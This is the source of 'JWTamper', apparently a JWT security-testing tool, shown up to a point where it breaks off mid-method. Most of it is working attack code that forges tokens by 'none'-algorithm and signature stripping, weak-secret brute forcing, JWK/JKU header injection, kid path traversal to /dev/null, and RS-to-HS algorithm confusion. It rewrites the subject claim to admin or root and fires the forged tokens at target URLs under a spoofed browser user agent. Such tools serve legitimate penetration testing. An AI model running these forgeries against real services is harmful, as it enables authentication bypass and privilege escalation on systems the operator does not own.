#!/usr/bin/env python3
import json
import base64
import hmac
import hashlib
import requests
import argparse
import sys
import os
import pickle
from typing import Dict, List, Any, Optional, Generator
from abc import ABC, abstractmethod
from dataclasses import dataclass
from urllib.parse import urlparse, urljoin
import time

try:
    from cryptography.hazmat.primitives.asymmetric import rsa
    from cryptography.hazmat.primitives import hashes, serialization
    from cryptography.hazmat.primitives.asymmetric import padding
    from cryptography.exceptions import InvalidSignature
    CRYPTO_AVAILABLE = True
except ImportError:
    CRYPTO_AVAILABLE = False

def print_banner():
    banner = """
       █████ █████   ███   █████ ███████████
      ▒▒███ ▒▒███   ▒███  ▒▒███ ▒█▒▒▒███▒▒▒█
       ▒███  ▒███   ▒███   ▒███ ▒   ▒███  ▒   ██████   █████████████   ████████   ██████  ████████
       ▒███  ▒███   ▒███   ▒███     ▒███     ▒▒▒▒▒███ ▒▒███▒▒███▒▒███ ▒▒███▒▒███ ███▒▒███▒▒███▒▒███
       ▒███  ▒▒███  █████  ███      ▒███      ███████  ▒███ ▒███ ▒███  ▒███ ▒███▒███████  ▒███ ▒▒▒
 ███   ▒███   ▒▒▒█████▒█████▒       ▒███     ███▒▒███  ▒███ ▒███ ▒███  ▒███ ▒███▒███▒▒▒   ▒███
▒▒████████      ▒▒███ ▒▒███         █████   ▒▒████████ █████▒███ █████ ▒███████ ▒▒██████  █████
 ▒▒▒▒▒▒▒▒        ▒▒▒   ▒▒▒         ▒▒▒▒▒     ▒▒▒▒▒▒▒▒ ▒▒▒▒▒ ▒▒▒ ▒▒▒▒▒  ▒███▒▒▒   ▒▒▒▒▒▒  ▒▒▒▒▒
                                                                       ▒███
                                                                       █████
                                                                      ▒▒▒▒▒
        Automated JWT Testing
        Version: 1.0.0

        [+] Automated JWT vulnerability detection
        [+] Supports multiple attack techniques

"""
    print(banner)

# ============================================================================
# Core Framework Classes
# ============================================================================

@dataclass
class JWTToken:
    raw_token: str
    header: Dict[str, Any]
    payload: Dict[str, Any]
    signature: str

    @classmethod
    def parse(cls, token: str) -> 'JWTToken':
        try:
            parts = token.split('.')
            if len(parts) != 3:
                raise ValueError("Invalid JWT format - must have 3 parts")

            header = cls._decode_base64_json(parts[0])
            payload = cls._decode_base64_json(parts[1])
            signature = parts[2]

            return cls(token, header, payload, signature)

        except Exception as e:
            raise ValueError(f"Failed to parse JWT: {e}")

    @staticmethod
    def _decode_base64_json(data: str) -> Dict[str, Any]:
        data += '=' * (4 - len(data) % 4)
        decoded = base64.urlsafe_b64decode(data)
        return json.loads(decoded.decode('utf-8'))

    @staticmethod
    def _encode_base64_json(data: Dict[str, Any]) -> str:
        json_str = json.dumps(data, separators=(',', ':'))
        encoded = base64.urlsafe_b64encode(json_str.encode('utf-8'))
        return encoded.decode('utf-8').rstrip('=')

    def rebuild(self, header: Optional[Dict] = None, payload: Optional[Dict] = None,
                signature: Optional[str] = None) -> str:
        new_header = header if header is not None else self.header
        new_payload = payload if payload is not None else self.payload
        new_signature = signature if signature is not None else self.signature

        header_b64 = self._encode_base64_json(new_header)
        payload_b64 = self._encode_base64_json(new_payload)

        return f"{header_b64}.{payload_b64}.{new_signature}"

@dataclass
class TestResult:
    module_name: str
    attack_name: str
    original_token: str
    modified_token: str
    url: str
    success: bool
    status_code: int
    response_length: int
    response_time: float
    notes: str = ""

class JWTAttackModule(ABC):

    def __init__(self, config: Dict[str, Any] = None):
        self.config = config or {}

    @property
    @abstractmethod
    def name(self) -> str:
        pass

    @property
    @abstractmethod
    def description(self) -> str:
        pass

    @abstractmethod
    def can_attack(self, token: JWTToken) -> bool:
        pass

    @abstractmethod
    def generate_payloads(self, token: JWTToken) -> Generator[tuple[str, str], None, None]:
        pass

class RequestHandler:

    def __init__(self, timeout: int = 10):
        self.session = requests.Session()
        self.timeout = timeout

        # Setting a realistic user agent to avoid any potential issues
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })

    def test_jwt(self, url: str, token: str, method: str = 'GET',
                 headers: Dict[str, str] = None) -> tuple[int, int, float]:
        test_headers = headers.copy() if headers else {}

        start_time = time.time()
        try:
            # Trying both Authorization header and session cookies
            results = []

            # Method 1: Authorization Bearer header (just in case)
            auth_headers = test_headers.copy()
            auth_headers['Authorization'] = f'Bearer {token}'

            response = self.session.request(
                method, url, headers=auth_headers, timeout=self.timeout
            )
            response_time = time.time() - start_time
            results.append((response.status_code, len(response.content), response_time))

            # Method 2: Common cookie names (might need to add more in the future as I come across them)
            cookie_names = ['session', 'jwt', 'token', 'auth', 'access_token', 'sessionId', 'sid']

            best_cookie_result = None
            for cookie_name in cookie_names:
                try:
                    cookie_headers = test_headers.copy()
                    cookies = {cookie_name: token}

                    start_time = time.time()
                    response = self.session.request(
                        method, url, headers=cookie_headers, cookies=cookies, timeout=self.timeout
                    )
                    response_time = time.time() - start_time
                    cookie_result = (response.status_code, len(response.content), response_time)

                    if best_cookie_result is None or \
                       (cookie_result[0] < 400 and best_cookie_result[0] >= 400) or \
                       (cookie_result[0] == 200 and best_cookie_result[0] != 200):
                        best_cookie_result = cookie_result

                except:
                    continue

            auth_result = results[0]

            if best_cookie_result and \
               ((best_cookie_result[0] < 400 and auth_result[0] >= 400) or \
                (best_cookie_result[0] == 200 and auth_result[0] != 200)):
                return best_cookie_result
            else:
                return auth_result

        except requests.RequestException as e:
            response_time = time.time() - start_time
            return 0, 0, response_time

# ============================================================================
# Attack Modules
# ============================================================================

class NoneAlgorithmModule(JWTAttackModule):

    def __init__(self, config: Dict[str, Any] = None):
        super().__init__(config)
        self.custom_user = None

    @property
    def name(self) -> str:
        return "none_algorithm"

    @property
    def description(self) -> str:
        return "Tests 'none' algorithm bypass by removing signature"

    def can_attack(self, token: JWTToken) -> bool:
        return True

    def set_custom_user(self, username: str):
        self.custom_user = username

    def generate_payloads(self, token: JWTToken) -> Generator[tuple[str, str], None, None]:

        if self.custom_user:
            # If custom user specified, ONLY test that user
            claim_modifications = [
                ('custom_user', {**token.payload, 'sub': self.custom_user}),
            ]
        else:
            # Default behavior - test standard privilege escalation targets as seen below (could add more?)
            claim_modifications = [
                ('original_claims', token.payload),
                ('admin_user', {**token.payload, 'sub': 'administrator'}),
                ('admin_alt', {**token.payload, 'sub': 'admin'}),
                ('root_user', {**token.payload, 'sub': 'root'}),
            ]

        alg_variations = [
            ('none', 'none'),
            ('none_caps', 'None'),
            ('none_upper', 'NONE')
        ]

        for mod_name, modified_payload in claim_modifications:
            for alg_name, alg_value in alg_variations:
                header_none = token.header.copy()
                header_none['alg'] = alg_value
                modified_token = token.rebuild(header=header_none, payload=modified_payload, signature='')
                yield (f"none_{alg_name}_{mod_name}", modified_token)

class WeakSecretModule(JWTAttackModule):

    def __init__(self, config: Dict[str, Any] = None):
        super().__init__(config)
        self.custom_user = None
        self.stop_on_success = True  # Needed this to avoid looping through secrets if one successful one was found
        # Massive wordlist here: https://github.com/wallarm/jwt-secrets/blob/master/jwt.secrets.list
        self.wordlist = self.config.get('wordlist', [
            '',
            'secret',
            'secret1',
            'secretkey',
            'jwt',
            'thisisthesecretkey',
            'myJwtSecret',
            'mysecretstring',
            'supersecret',
            'token',
            'password',
            'your-256-bit-secret',
            'my-secret',
            'jwt-secret',
            'topsecret',
            'private-key',
            'secret-key',
            'changeme',
            'default',
            'admin',
            'test',
            'demo',
            'password',
            'sample',
            'example',
            '123456',
            'qwerty',
            'admin',
            'root',
            'user',
            '123456',
            '1234',
            '12345',
            '123456789',
            'secret_key_base',
            'secret_token',
            'app_secret',
            'application_secret',
            'please-change-me',
            'change-this-key',
            'insecure-secret',
            'dev-secret',
            'development',
            'production',
            'staging',
            'a',
            'x',
            '1',
            '0',
            'qwertyuiop',
            'asdfgh',
            '123qwe',
            'abc123',
            'jwt-key-string',
            'my-jwt-secret',
            'authentication-secret',
            'session-secret',
            'token-secret'
        ])

    @property
    def name(self) -> str:
        return "weak_secret"

    @property
    def description(self) -> str:
        return "Brute forces weak HMAC secrets using comprehensive wordlist"

    def can_attack(self, token: JWTToken) -> bool:
        alg = token.header.get('alg', '').lower()
        return alg.startswith('hs')

    def set_custom_user(self, username: str):
        self.custom_user = username

    def generate_payloads(self, token: JWTToken) -> Generator[tuple[str, str], None, None]:
        alg = token.header.get('alg', 'HS256')

        print(f"[+] Testing {len(self.wordlist)} potential secrets...")

        if self.custom_user:
            claim_modifications = [
                ('custom_user', {**token.payload, 'sub': self.custom_user}),
            ]
            print(f"[+] Targeting specific user: {self.custom_user}")
        else:
            claim_modifications = [
                ('original_claims', token.payload),
                ('admin_user', {**token.payload, 'sub': 'administrator'}),
                ('admin_alt', {**token.payload, 'sub': 'admin'}),
                ('root_user', {**token.payload, 'sub': 'root'}),
            ]

        for mod_name, modified_payload in claim_modifications:
            header_b64 = token._encode_base64_json(token.header)
            payload_b64 = token._encode_base64_json(modified_payload)
            unsigned_token = f"{header_b64}.{payload_b64}"

            for secret in self.wordlist:
                try:
                    if alg.upper() == 'HS256':
                        signature = hmac.new(
                            secret.encode('utf-8'),
                            unsigned_token.encode('utf-8'),
                            hashlib.sha256
                        ).digest()
                    elif alg.upper() == 'HS384':
                        signature = hmac.new(
                            secret.encode('utf-8'),
                            unsigned_token.encode('utf-8'),
                            hashlib.sha384
                        ).digest()
                    elif alg.upper() == 'HS512':
                        signature = hmac.new(
                            secret.encode('utf-8'),
                            unsigned_token.encode('utf-8'),
                            hashlib.sha512
                        ).digest()
                    else:
                        continue

                    signature_b64 = base64.urlsafe_b64encode(signature).decode('utf-8').rstrip('=')
                    modified_token = f"{unsigned_token}.{signature_b64}"

                    secret_name = secret if secret else "empty"
                    if len(secret_name) > 20:
                        secret_name = secret_name[:17] + "..."

                    attack_name = f"weak_secret_{secret_name}_{mod_name}"
                    yield (attack_name, modified_token)

                except Exception:
                    continue

class UnsignedJWTModule(JWTAttackModule):

    def __init__(self, config: Dict[str, Any] = None):
        super().__init__(config)
        self.custom_user = None

    @property
    def name(self) -> str:
        return "unsigned_jwt"

    @property
    def description(self) -> str:
        return "Tests if server accepts unsigned or invalid JWT signatures"

    def can_attack(self, token: JWTToken) -> bool:
        return True

    def set_custom_user(self, username: str):
        self.custom_user = username

    def generate_payloads(self, token: JWTToken) -> Generator[tuple[str, str], None, None]:

        parts = token.raw_token.split('.')

        if self.custom_user:
            claim_modifications = [
                ('custom_user', {**token.payload, 'sub': self.custom_user}),
            ]
        else:
            claim_modifications = [
                ('original_claims', token.payload),
                ('admin_user', {**token.payload, 'sub': 'administrator'}),
                ('admin_alt', {**token.payload, 'sub': 'admin'}),
                ('root_user', {**token.payload, 'sub': 'root'}),
            ]

        for mod_name, modified_payload in claim_modifications:
            new_payload_b64 = token._encode_base64_json(modified_payload)
            modified_token = f"{parts[0]}.{new_payload_b64}.{parts[2]}"

            yield (f"unverified_sig_{mod_name}", modified_token)

            header_payload = f"{parts[0]}.{new_payload_b64}"
            yield (f"no_signature_{mod_name}", f"{header_payload}.")

            yield (f"invalid_sig_{mod_name}", f"{header_payload}.invalid")

            import random
            import string
            random_sig = ''.join(random.choices(string.ascii_letters + string.digits + '-_', k=32))
            yield (f"random_sig_{mod_name}", f"{header_payload}.{random_sig}")

        header_payload = f"{parts[0]}.{parts[1]}"
        yield ("original_no_sig", f"{header_payload}.")

        yield ("original_garbage_sig", f"{header_payload}.garbage_signature_test")

class JWKHeaderInjectionModule(JWTAttackModule):

    def __init__(self, config: Dict[str, Any] = None):
        super().__init__(config)
        self.generated_keys = []
        self.custom_user = None

    @property
    def name(self) -> str:
        return "jwk_injection"

    @property
    def description(self) -> str:
        return "Tests JWK header injection using real RSA key pairs"

    def can_attack(self, token: JWTToken) -> bool:
        return CRYPTO_AVAILABLE

    def set_custom_user(self, username: str):
        self.custom_user = username

    def generate_payloads(self, token: JWTToken) -> Generator[tuple[str, str], None, None]:

        if not CRYPTO_AVAILABLE:
            print("[x] Cryptography library required for JWK injection")
            return

        if not self.generated_keys:
            self._generate_test_keys()

        if self.custom_user:
            claim_modifications = [
                ('custom_user', {**token.payload, 'sub': self.custom_user}),
            ]
        else:
            claim_modifications = [
                ('admin_user', {**token.payload, 'sub': 'administrator'}),
                ('admin_alt', {**token.payload, 'sub': 'admin'}),
                ('root_user', {**token.payload, 'sub': 'root'}),
            ]

        for key_info in self.generated_keys:
            private_key = key_info['private_key']
            public_jwk = key_info['public_jwk']
            kid = public_jwk['kid']

            for mod_name, modified_payload in claim_modifications:
                new_header = {
                    "alg": "RS256",
                    "typ": "JWT",
                    "jwk": public_jwk
                }

                header_b64 = token._encode_base64_json(new_header)
                payload_b64 = token._encode_base64_json(modified_payload)
                unsigned_token = f"{header_b64}.{payload_b64}"

                signature = self._sign_rs256(unsigned_token, private_key)
                modified_token = f"{unsigned_token}.{signature}"

                yield (f"jwk_embed_{mod_name}_{kid}", modified_token)

    def _generate_test_keys(self):
        try:
            for i in range(2):
                private_key = rsa.generate_private_key(
                    public_exponent=65537,
                    key_size=2048,
                )

                public_key = private_key.public_key()

                public_jwk = self._rsa_public_key_to_jwk(public_key, f"jwtamper-key-{i+1}")

                self.generated_keys.append({
                    'private_key': private_key,
                    'public_jwk': public_jwk
                })

        except Exception as e:
            print(f"[x] Error generating RSA keys: {e}")

    def _rsa_public_key_to_jwk(self, public_key, kid: str) -> Dict[str, str]:
        try:
            public_numbers = public_key.public_numbers()

            n_bytes = public_numbers.n.to_bytes((public_numbers.n.bit_length() + 7) // 8, 'big')
            e_bytes = public_numbers.e.to_bytes((public_numbers.e.bit_length() + 7) // 8, 'big')

            n_b64 = base64.urlsafe_b64encode(n_bytes).decode('utf-8').rstrip('=')
            e_b64 = base64.urlsafe_b64encode(e_bytes).decode('utf-8').rstrip('=')

            return {
                "kty": "RSA",
                "kid": kid,
                "use": "sig",
                "alg": "RS256",
                "n": n_b64,
                "e": e_b64
            }

        except Exception as e:
            print(f"[x] Error converting RSA key to JWK: {e}")
            return {}

    def _sign_rs256(self, unsigned_token: str, private_key) -> str:
        try:
            signature = private_key.sign(
                unsigned_token.encode('utf-8'),
                padding.PKCS1v15(),
                hashes.SHA256()
            )

            signature_b64 = base64.urlsafe_b64encode(signature).decode('utf-8').rstrip('=')
            return signature_b64

        except Exception as e:
            print(f"[x] Error signing with RSA: {e}")
            return "signature_error"

    def print_jwk_set(self):
        if not self.generated_keys:
            self._generate_test_keys()

        jwk_set = {
            "keys": [key_info['public_jwk'] for key_info in self.generated_keys]
        }

        print("\n[+] JWK Set to host on exploit server:")
        print("="*50)
        print(json.dumps(jwk_set, indent=2))
        print("="*50)
        print("[+] Upload this JSON to your exploit server as /jwks.json")
        print("[+] Then use --jku-urls https://your-exploit-server.com/jwks.json")
        return jwk_set

class AlgorithmConfusionModule(JWTAttackModule):

    def __init__(self, config: Dict[str, Any] = None):
        super().__init__(config)
        self.custom_user = None
        self.discovered_keys = []

    @property
    def name(self) -> str:
        return "algorithm_confusion"

    @property
    def description(self) -> str:
        return "Tests algorithm confusion by using RSA public keys as HMAC secrets"

    def can_attack(self, token: JWTToken) -> bool:
        alg = token.header.get('alg', '').lower()
        return alg.startswith('rs') or alg.startswith('ps')

    def set_custom_user(self, username: str):
        self.custom_user = username

    def generate_payloads(self, token: JWTToken) -> Generator[tuple[str, str], None, None]:

        if not CRYPTO_AVAILABLE:
            print("[x] Cryptography library required for algorithm confusion")
            return

        if not self.discovered_keys:
            print("[x] No RSA public keys available - run discovery first")
            return

        print(f"[+] Using {len(self.discovered_keys)} discovered RSA keys for algorithm confusion")

        if self.custom_user:
            claim_modifications = [
                ('custom_user', {**token.payload, 'sub': self.custom_user}),
            ]
        else:
            claim_modifications = [
                ('original_claims', token.payload),
                ('admin_user', {**token.payload, 'sub': 'administrator'}),
                ('admin_alt', {**token.payload, 'sub': 'admin'}),
                ('root_user', {**token.payload, 'sub': 'root'}),
            ]

        for key_info in self.discovered_keys:
            pem_secret = key_info['pem_bytes']
            key_source = key_info['source']
            kid = key_info['kid']

            print(f"[+] Testing algorithm confusion with key {key_source} (kid: {kid})")

            for mod_name, modified_payload in claim_modifications:
                confused_header = token.header.copy()
                confused_header['alg'] = 'HS256'

                header_b64 = token._encode_base64_json(confused_header)
                payload_b64 = token._encode_base64_json(modified_payload)
                unsigned_token = f"{header_b64}.{payload_b64}"

                try:
                    signature = hmac.new(
                        pem_secret,
                        unsigned_token.encode('utf-8'),
                        hashlib.sha256
                    ).digest()

                    signature_b64 = base64.urlsafe_b64encode(signature).decode('utf-8').rstrip('=')
                    modified_token = f"{unsigned_token}.{signature_b64}"

                    attack_name = f"alg_confusion_{key_source}_{mod_name}"
                    yield (attack_name, modified_token)

                except Exception as e:
                    print(f"[x] Error generating payload for {key_source}: {e}")
                    continue

    def _extract_base_urls(self) -> List[str]:
        return []

    def _discover_public_keys(self, base_urls: List[str]):
        self.discovered_keys = []
        # Maybe use Google BigQuery to find more common examples?
        jwk_paths = [
            '/jwks.json',
            '/.well-known/jwks.json',
            '/.well-known/openid_configuration',
            '/oauth/jwks',
            '/auth/jwks.json',
            '/api/jwks.json'
        ]

        session = requests.Session()
        session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })

        for base_url in base_urls:
            for jwk_path in jwk_paths:
                try:
                    url = base_url.rstrip('/') + jwk_path
                    print(f"[+] Checking JWK endpoint: {url}")

                    response = session.get(url, timeout=10)
                    if response.status_code == 200:
                        self._parse_jwk_response(response.text, url)

                except Exception as e:
                    continue

    def _parse_jwk_response(self, response_text: str, source_url: str):
        try:
            data = json.loads(response_text)

            if 'keys' in data:
                keys = data['keys']
            else:
                keys = [data]

            for jwk in keys:
                if jwk.get('kty') == 'RSA' and 'n' in jwk and 'e' in jwk:
                    print(f"[+] Found RSA key in {source_url}")
                    pem_bytes = self._jwk_to_pem_bytes(jwk)
                    if pem_bytes:
                        key_info = {
                            'pem_bytes': pem_bytes,
                            'source': f"jwk_{len(self.discovered_keys)}",
                            'kid': jwk.get('kid', 'unknown')
                        }
                        self.discovered_keys.append(key_info)
                        print(f"[+] Successfully converted RSA key to PEM (kid: {key_info['kid']})")
                    else:
                        print(f"[x] Failed to convert RSA key to PEM")
        except Exception as e:
            print(f"[x] Error parsing JWK from {source_url}: {e}")

    def _jwk_to_pem_bytes(self, jwk: Dict[str, str]) -> Optional[bytes]:
        try:
            n_padded = jwk['n'] + '=' * (4 - len(jwk['n']) % 4)
            e_padded = jwk['e'] + '=' * (4 - len(jwk['e']) % 4)
            n_bytes = base64.urlsafe_b64decode(n_padded)
            e_bytes = base64.urlsafe_b64decode(e_padded)
            n = int.from_bytes(n_bytes, 'big')
            e = int.from_bytes(e_bytes, 'big')
            from cryptography.hazmat.primitives.asymmetric import rsa
            public_numbers = rsa.RSAPublicNumbers(e, n)
            public_key = public_numbers.public_key()
            pem = public_key.public_bytes(
                encoding=serialization.Encoding.PEM,
                format=serialization.PublicFormat.SubjectPublicKeyInfo
            )
            print(f"[+] Generated PEM key ({len(pem)} bytes)")
            return pem
        except Exception as e:
            print(f"[x] Error converting JWK to PEM: {e}")
            return None

    def set_target_urls(self, urls: List[str]):
        base_urls = []
        for url in urls:
            from urllib.parse import urlparse
            parsed = urlparse(url)
            base_url = f"{parsed.scheme}://{parsed.netloc}"
            if base_url not in base_urls:
                base_urls.append(base_url)
        print(f"[+] Discovering public keys from {len(base_urls)} base URLs")
        self._discover_public_keys(base_urls)

class KidPathTraversalModule(JWTAttackModule):

    def __init__(self, config: Dict[str, Any] = None):
        super().__init__(config)
        self.custom_user = None

    @property
    def name(self) -> str:
        return "kid_path_traversal"

    @property
    def description(self) -> str:
        return "Tests kid header path traversal to predictable files"

    def can_attack(self, token: JWTToken) -> bool:
        alg = token.header.get('alg', '').lower()
        return alg.startswith('hs')

    def set_custom_user(self, username: str):
        self.custom_user = username

    def generate_payloads(self, token: JWTToken) -> Generator[tuple[str, str], None, None]:

        alg = token.header.get('alg', 'HS256')

        if self.custom_user:
            claim_modifications = [
                ('custom_user', {**token.payload, 'sub': self.custom_user}),
            ]
        else:
            claim_modifications = [
                ('original_claims', token.payload),
                ('admin_user', {**token.payload, 'sub': 'administrator'}),
                ('admin_alt', {**token.payload, 'sub': 'admin'}),
                ('root_user', {**token.payload, 'sub': 'root'}),
            ]

        path_secrets = [
            ('../../../../../../../dev/null', b'\x00', 'dev_null'),
            ('../../../../../../../../dev/null', b'\x00', 'dev_null_deep'),
            ('/dev/null', b'\x00', 'dev_null_absolute'),
            ('../../../../../../../proc/version', b'', 'proc_version_empty'),
            ('../../../../../../../etc/hostname', b'', 'hostname_empty'),
            ('../../../../../../../proc/sys/kernel/version', b'', 'kernel_version'),
            ('../../../../../../../dev/null', b'', 'dev_null_empty'),
            ('../../../../../../../dev/null', b'\x00\x00', 'dev_null_double'),
            ('..\\..\\..\\..\\..\\..\\..\\dev\\null', b'\x00', 'dev_null_windows'),
            ('....//....//....//....//dev/null', b'\x00', 'dev_null_alt'),
        ]

        for mod_name, modified_payload in claim_modifications:
            for path_traversal, secret_bytes, path_name in path_secrets:
                modified_header = token.header.copy()
                modified_header['kid'] = path_traversal

                header_b64 = token._encode_base64_json(modified_header)
                payload_b64 = token._encode_base64_json(modified_payload)
                unsigned_token = f"{header_b64}.{payload_b64}"

                try:
                    if alg.upper() == 'HS256':
                        signature = hmac.new(
                            secret_bytes,
                            unsigned_token.encode('utf-8'),
                            hashlib.sha256
                        ).digest()
                    elif alg.upper() == 'HS384':
                        signature = hmac.new(
                            secret_bytes,
                            unsigned_token.encode('utf-8'),
                            hashlib.sha384
                        ).digest()
                    elif alg.upper() == 'HS512':
                        signature = hmac.new(
                            secret_bytes,
                            unsigned_token.encode('utf-8'),
                            hashlib.sha512
                        ).digest()
                    else:
                        continue

                    signature_b64 = base64.urlsafe_b64encode(signature).decode('utf-8').rstrip('=')
                    modified_token = f"{unsigned_token}.{signature_b64}"

                    attack_name = f"kid_traversal_{path_name}_{mod_name}"
                    yield (attack_name, modified_token)

                except Exception:
                    continue

class JKUHeaderInjectionModule(JWTAttackModule):

    def __init__(self, config: Dict[str, Any] = None):
        super().__init__(config)
        self.generated_keys = []
        self.custom_user = None
        self.exploit_urls = []
        self.keys_file = os.path.expanduser("~/.jwtamper_jku_keys.pkl")

    @property
    def name(self) -> str:
        return "jku_injection"

    @property
    def description(self) -> str:
        return "Tests JKU header injection using external JWK Set URLs"

    def can_attack(self, token: JWTToken) -> bool:
        return CRYPTO_AVAILABLE

    def set_custom_user(self, username: str):
        self.custom_user = username

    def set_exploit_urls(self, urls: List[str]):
        self.exploit_urls = urls

    def generate_payloads(self, token: JWTToken) -> Generator[tuple[str, str], None, None]:
        """Generate JKU injection payloads with external JWK Set references"""

        if not CRYPTO_AVAILABLE:
            print("[x] Cryptography library required for JKU injection")
            return

        # Load previously saved keys if they exist
        self._load_saved_keys()

        # Require explicit JKU URLs - no dangerous defaults
        if not self.exploit_urls:
            print("[x] No JKU URLs provided. Use --jku-urls to specify your exploit server URLs")
            print("[x] Example: --jku-urls https://your-server.com/jwks.json")
            print("[x] You must host the JWK set on a server you control")
            return

        # Test different claim modifications
        if self.custom_user:
            claim_modifications = [
                ('custom_user', {**token.payload, 'sub': self.custom_user}),
            ]
        else:
            claim_modifications = [
                ('admin_user', {**token.payload, 'sub': 'administrator'}),
                ('admin_alt', {**token.payload, 'sub': 'admin'}),
                ('root_user', {**token.payload, 'sub': 'root'}),
            ]

        print(f"[+] Testing JKU injection with {len(self.exploit_urls)} URLs")

        for key_info in self.generated_keys:
            private_key = key_info['private_key']
            public_jwk = key_info['public_jwk']
            kid = public_jwk['kid']  # This should be jku-key-1, jku-key-2, etc.

            for mod_name, modified_payload in claim_modifications:
                for exploit_url in self.exploit_urls:
                    new_header = {
                        "alg": "RS256",
                        "typ": "JWT",
                        "kid": kid,  # Use the NEW kid, not the original
                        "jku": exploit_url
                    }

                    header_b64 = token._encode_base64_json(new_header)
                    payload_b64 = token._encode_base64_json(modified_payload)
                    unsigned_token = f"{header_b64}.{payload_b64}"

                    signature = self._sign_rs256(unsigned_token, private_key)
                    modified_token = f"{unsigned_token}.{signature}"

                    url_clean = exploit_url.replace("https://", "").replace("http://", "").replace("/", "_").replace(".", "_")[:20]
                    attack_name = f"jku_{mod_name}_{kid}_{url_clean}"
                    yield (attack_name, modified_token)

    def _generate_test_keys_with_kid(self, kid: str):
        try:
            private_key = rsa.generate_private_key(
                public_exponent=65537,
                key_size=2048,
            )
            public_key = private_key.public_key()
            public_jwk = self._rsa_public_key_to_jwk(public_key, kid)

            self.generated_keys.append({
                'private_key': private_key,
                'public_jwk': public_jwk
            })

        except Exception as e:
            print(f"[x] Error generating RSA keys: {e}")

    def _generate_test_keys(self):
        try:
            for i in range(2):
                private_key = rsa.generate_private_key(
                    public_exponent=65537,
                    key_size=2048,
                )
                public_key = private_key.public_key()
                public_jwk = self._rsa_public_key_to_jwk(public_key, f"jku-key-{i+1}")

                self.generated_keys.append({
                    'private_key': private_key,
                    'public_jwk': public_jwk
                })

            self._save_keys()

        except Exception as e:
            print(f"[x] Error generating RSA keys: {e}")

    def _save_keys(self):
        try:
            serializable_keys = []
            for key_info in self.generated_keys:
                private_key = key_info['private_key']
                public_jwk = key_info['public_jwk']

                private_pem = private_key.private_bytes(
                    encoding=serialization.Encoding.PEM,
                    format=serialization.PrivateFormat.PKCS8,
                    encryption_algorithm=serialization.NoEncryption()
                ).decode('utf-8')

                serializable_keys.append({
                    'private_pem': private_pem,
                    'public_jwk': public_jwk
                })

            with open(self.keys_file, 'wb') as f:
                pickle.dump(serializable_keys, f)
        except Exception as e:
            print(f"[x] Warning: Could not save keys to file: {e}")

    def _load_saved_keys(self):
        try:
            if os.path.exists(self.keys_file) and os.path.getsize(self.keys_file) > 0:
                with open(self.keys_file, 'rb') as f:
                    serializable_keys = pickle.load(f)

                if not isinstance(serializable_keys, list) or len(serializable_keys) == 0:
                    raise ValueError("Invalid saved keys format")

                self.generated_keys = []
                for key_data in serializable_keys:
                    if 'private_pem' not in key_data or 'public_jwk' not in key_data:
                        raise ValueError("Missing key data")

                    private_pem = key_data['private_pem'].encode('utf-8')
                    public_jwk = key_data['public_jwk']

                    private_key = serialization.load_pem_private_key(
                        private_pem,
                        password=None
                    )

                    self.generated_keys.append({
                        'private_key': private_key,
                        'public_jwk': public_jwk
                    })

                print(f"[+] Loaded {len(self.generated_keys)} saved keys")
            else:
                print("[+] No saved keys found, generating new ones")
                self._generate_test_keys()
        except Exception as e:
            print(f"[x] Error loading saved keys: {e}")
            try:
                if os.path.exists(self.keys_file):
                    os.remove(self.keys_file)
                    print("[+] Removed corrupted keys file")
            except:
                pass
            print("[+] Generating fresh keys")
            self._generate_test_keys()

    def _rsa_public_key_to_jwk(self, public_key, kid: str) -> Dict[str, str]:
        try:
            public_numbers = public_key.public_numbers()
            n_bytes = public_numbers.n.to_bytes((public_numbers.n.bit_length() + 7) // 8, 'big')
            e_bytes = public_numbers.e.to_bytes((public_numbers.e.bit_length() + 7) // 8, 'big')
            n_b64 = base64.urlsafe_b64encode(n_bytes).decode('utf-8').rstrip('=')
            e_b64 = base64.urlsafe_b64encode(e_bytes).decode('utf-8').rstrip('=')

            return {
                "kty": "RSA",
                "kid": kid,
                "use": "sig",
                "alg": "RS256",
                "n": n_b64,
                "e": e_b64
            }
        except Exception as e:
            print(f"[x] Error converting RSA key to JWK: {e}")
            return {}

    def _sign_rs256(self, unsigned_token: str, private_key) -> str:
        try:
            signature = private_key.sign(
                unsigned_token.encode('utf-8'),
                padding.PKCS1v15(),
                hashes.SHA256()
            )
            signature_b64 = base64.urlsafe_b64encode(signature).decode('utf-8').rstrip('=')
            return signature_b64
        except Exception as e:
            print(f"[x] Error signing with RSA: {e}")
            return "signature_error"

    def print_jwk_set(self):
        self.generated_keys = []
        self._generate_test_keys()

        jwk_set = {
            "keys": [key_info['public_jwk'] for key_info in self.generated_keys]
        }

        print("\n[+] JWK Set to host on exploit server:")
        print("="*50)
        print(json.dumps(jwk_set, indent=2))
        print("="*50)
        print("[+] Upload this JSON to your exploit server as /jwks.json")
        print("[+] Then use --jku-urls https://your-exploit-server.com/jwks.json")
        print(f"[+] Keys saved to {self.keys_file} for attack reuse")
        return jwk_set

# ============================================================================
# Main Framework Class
# ============================================================================

class JWTamper:

    def __init__(self):
        self.modules = {}
        self.request_handler = RequestHandler()
        self.results = []

        self._register_module(NoneAlgorithmModule())
        self._register_module(WeakSecretModule())
        self._register_module(UnsignedJWTModule())
        self._register_module(JWKHeaderInjectionModule())
        self._register_module(JKUHeaderInjectionModule())
        self._register_module(KidPathTraversalModule())
        self._register_module(AlgorithmConfusionModule())

    def _register_module(self, module: JWTAttackModule):
        self.modules[module.name] = module

    def list_modules(self) -> List[str]:
        return list(self.modules.keys())

    def test_token(self, token_str: str, urls: List[str],
                   modules: List[str] = None, method: str = 'GET', custom_user: str = None, args = None) -> List[TestResult]:

        try:
            token = JWTToken.parse(token_str)
        except ValueError as e:
            print(f"[x] Error: {e}")
            return []

        print(f"[+] Parsed JWT Token:")
        print(f"    Algorithm: {token.header.get('alg', 'unknown')}")
        print(f"    Claims: {list(token.payload.keys())}")
        if custom_user:
            print(f"    Custom target user: {custom_user}")
        print()

        if modules is None:
            modules = list(self.modules.keys())

        results = []

        for url in urls:
            print(f"[+] Testing {url}...")

            original_status, original_length, original_time = self.request_handler.test_jwt(
                url, token_str, method
            )
            print(f"    Original token: {original_status} ({original_length} bytes, {original_time:.2f}s)")

            for module_name in modules:
                if module_name not in self.modules:
                    print(f"    [x] Warning: Module '{module_name}' not found")
                    continue

                module = self.modules[module_name]

                if not module.can_attack(token):
